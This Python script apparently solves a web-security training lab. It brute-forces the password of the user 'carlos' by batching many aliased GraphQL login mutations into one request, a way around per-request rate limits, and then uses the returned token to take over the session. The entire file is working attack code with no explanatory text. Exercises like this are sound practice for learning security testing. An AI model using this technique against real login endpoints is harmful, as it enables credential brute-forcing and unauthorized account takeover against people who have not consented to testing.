import requests
import json
import sys


class Solver:
    def __init__(self, lab_url, passwords_file):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.passwords_file = passwords_file
        self.session = requests.Session()
        self.password = None

    def preparing_the_attack(self):
        graphql_query = '''mutation {{{}\n}}'''
        aliases = ''
        with open(self.passwords_file) as f:
            for password in f.readlines():
                aliases += '\n\tpassword_{}: login(input: {{ username: "carlos", password: "{}" }}) {{success token}}'.format(password.strip(), password.strip())
        graphql_query = graphql_query.format(aliases)
        payload = {
            'query': graphql_query
        }
        response = self.session.post(self.lab_url + 'graphql/v1', json=payload)
        self.password = [key.split('_')[1] for key, value in json.loads(response.text)['data'].items() if value['success']]
        self.password = ''.join(self.password)

    def signing_in(self):
        graphql_query = '''
        mutation login($input: LoginInput!) {
            login(input: $input) {
                success
                token
            }
        }
        '''
        variables = {
            'input': {
                'username': 'carlos',
                'password': self.password
            }
        }
        payload = {
            'query': graphql_query,
            'variables': variables
        }
        response = self.session.post(self.lab_url + 'graphql/v1', json=payload)
        self.session.cookies['session'] = json.loads(response.text)['data']['login']['token']
        self.session.get(self.lab_url + 'my-account')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.preparing_the_attack()
        self.signing_in()
        self.checking_solution()


solver = Solver(sys.argv[1], sys.argv[2])
solver.start()
